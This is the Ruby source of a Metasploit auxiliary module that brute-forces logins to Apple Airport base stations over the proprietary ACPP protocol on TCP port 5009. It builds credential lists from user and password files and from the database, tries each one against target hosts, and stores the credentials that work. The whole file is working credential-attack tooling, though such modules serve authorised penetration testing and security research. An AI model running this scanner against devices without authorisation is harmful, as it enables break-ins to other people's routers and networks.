##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/proto/acpp'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/acpp'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name'        => 'Apple Airport ACPP Authentication Scanner',
      'Description' => %q(
        This module attempts to authenticate to an Apple Airport using its
        proprietary and largely undocumented protocol known only as ACPP.
      ),
      'Author'      =>
        [
          'Jon Hart <jon_hart[at]rapid7.com>'
        ],
      'References'     =>
        [
          %w(CVE 2003-0270) # Fixed XOR key used to encrypt password
        ],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(5009),
      ], self.class)

    register_autofilter_ports([5009])
  end

  def run_host(ip)
    vprint_status("#{ip}:#{rport} - Starting ACPP login sweep")

    cred_collection = Metasploit::Framework::CredentialCollection.new(
        blank_passwords: datastore['BLANK_PASSWORDS'],
        pass_file: datastore['PASS_FILE'],
        password: datastore['PASSWORD'],
        user_file: datastore['USER_FILE'],
        userpass_file: datastore['USERPASS_FILE'],
        username: datastore['USERNAME'],
        user_as_pass: datastore['USER_AS_PASS']
    )

    cred_collection = prepend_db_passwords(cred_collection)

    scanner = Metasploit::Framework::LoginScanner::ACPP.new(
        host: ip,
        port: rport,
        proxies: datastore['PROXIES'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: datastore['ConnectTimeout'],
        max_send_size: datastore['TCP::max_send_size'],
        send_delay: datastore['TCP::send_delay'],
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)
        print_good("#{ip}:#{rport} - ACPP LOGIN SUCCESSFUL: #{result.credential}")
      else
        invalidate_login(credential_data)
        vprint_error("#{ip}:#{rport} - ACPP LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})")
      end
    end

  end
end
